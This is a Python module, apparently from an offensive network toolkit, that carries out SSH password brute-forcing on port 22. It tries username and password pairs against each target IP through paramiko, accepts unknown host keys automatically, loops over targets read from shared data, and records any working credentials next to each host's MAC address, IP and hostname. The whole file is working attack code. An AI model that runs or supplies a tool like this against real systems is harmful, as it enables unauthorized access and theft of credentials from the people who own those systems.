"""
ssh_connector.py — SSH brute force (port 22).

Thin adapter over BaseConnector (#12). Only attempt() and the module-level
b_* discovery globals live here; queue/worker/run_bruteforce are shared.
"""
import paramiko
import socket
from base_connector import BaseConnector, BaseBruteforce
from logger import Logger
import logging

logger = Logger(name="ssh_connector.py", level=logging.DEBUG)

b_class = "SSHBruteforce"
b_module = "ssh_connector"
b_status = "brute_force_ssh"
b_port = 22
b_parent = None


class SSHConnector(BaseConnector):
    PORT = 22
    HEADER = "MAC Address,IP Address,Hostname,User,Password,Port\n"
    OUTFILE_ATTR = "sshfile"
    PROGRESS_LABEL = "SSH"
    QUEUE_HAS_MAC = True

    def attempt(self, adresse_ip, user, password):
        """Auth-only SSH connect with hard wall-clock timeouts (#4)."""
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(
                adresse_ip,
                username=user,
                password=password,
                timeout=10,
                banner_timeout=10,
                auth_timeout=10,
            )
            return True
        except (paramiko.AuthenticationException, socket.error, paramiko.SSHException):
            return False
        finally:
            try:
                ssh.close()
            except Exception:
                pass


class SSHBruteforce(BaseBruteforce):
    connector_class = SSHConnector
    display_name = "SSHBruteforce"


if __name__ == "__main__":
    from shared import SharedData
    shared_data = SharedData()
    try:
        ssh_bruteforce = SSHBruteforce(shared_data)
        logger.info("Starting SSH brute force on port 22")
        for row in shared_data.read_data():
            ip = row["IPs"]
            logger.info(f"Executing SSHBruteforce on {ip}...")
            ssh_bruteforce.execute(ip, b_port, row, b_status)
        logger.info(f"Total successes: {len(ssh_bruteforce.connector.results)}")
    except Exception as e:
        logger.error(f"Error: {e}")
